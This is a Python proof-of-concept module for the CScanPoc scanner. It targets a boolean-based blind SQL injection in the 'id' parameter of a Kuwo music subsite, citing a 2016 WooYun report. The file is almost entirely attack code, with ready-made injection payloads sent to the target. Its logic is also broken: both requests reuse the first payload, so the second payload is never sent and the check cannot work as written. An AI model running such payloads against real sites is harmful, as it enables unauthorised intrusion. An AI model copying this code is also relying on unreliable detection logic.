# coding: utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Kuwo_0101'  # 平台漏洞编号
    name = '酷我音乐旗下分站存在sql注入'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-07-16'  # 漏洞公布时间
    desc = '''
    http://**.**.**/album/h/xinQingViewid=8&device=&user_id=418923
    注入点：id
    注入类型：Type: boolean-based blind
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=214936
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Kuwo(酷我)'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '7227809c-3048-4213-a8f4-1fd45e1597f7'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-09'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload1 = '/album/h/xinQingViewid=8 AND 8752=8752&device=&user_id=418923'
            payload2 = '/album/h/xinQingViewid=8 AND 8752=8753&device=&user_id=418923'
            url = self.target + payload1
            response = requests.get(url)
            response1 = requests.get(url)
            if response.text != response1.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
